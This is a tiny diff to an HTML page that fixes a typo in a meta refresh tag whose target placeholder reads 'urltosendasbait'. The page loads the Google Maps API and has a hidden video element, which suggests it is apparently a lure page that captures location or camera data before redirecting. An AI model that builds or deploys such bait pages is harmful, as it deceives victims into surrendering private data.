@@ -3,7 +3,7 @@
     <script src="http://maps.google.com/maps/api/js?sensor=true"></script>
     <script src="https://code.jquery.com/jquery-1.11.2.min.js"></script>
 
-    <meta http-equiv="Refresh" content="timeonseconds;url=urltosendasbait">
+    <meta http-equiv="Refresh" content="timeinseconds;url=urltosendasbait">
 
 
     <div class="video-wrap" hidden="hidden">
